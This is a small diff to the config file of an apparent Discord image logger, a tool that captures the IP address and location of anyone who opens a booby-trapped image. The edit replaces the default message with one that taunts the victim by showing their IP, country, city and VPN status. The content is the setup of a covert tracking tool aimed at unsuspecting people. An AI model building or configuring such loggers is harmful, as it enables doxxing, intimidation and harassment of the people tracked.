@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "Lmao such a goof your ip is {ip} :skull:, you live in {country} {city}, dont worry this was olny fun to test i wont use against you and i know for a fact you dont have a vpn and if you do i can see because of this {vpn} XD hehe", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
